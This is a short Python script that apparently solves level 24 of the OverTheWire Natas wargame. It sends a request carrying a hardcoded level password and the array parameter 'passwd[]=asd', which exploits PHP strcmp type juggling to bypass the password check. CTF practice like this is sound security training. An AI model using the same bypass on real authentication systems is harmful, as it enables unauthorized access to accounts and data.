import requests
from requests.auth import HTTPBasicAuth

basic_auth = HTTPBasicAuth('natas24', 'MeuqmfJ8DDKuTr5pcvzFKSwlxedZYEWd')

url = "http://natas24.natas.labs.overthewire.org/index.php"


def send_request(url) -> str:
    print(f"Sending request to [{url}]...")
    headers = {'Content-Type': 'text/html; charset=UTF-8'}
    response = requests.get(url,
                            headers=headers,
                            auth=basic_auth,
                            verify=False)
    return response.text


if __name__ == '__main__':
    text = send_request(url + f"?passwd[]=asd")
    print(text)
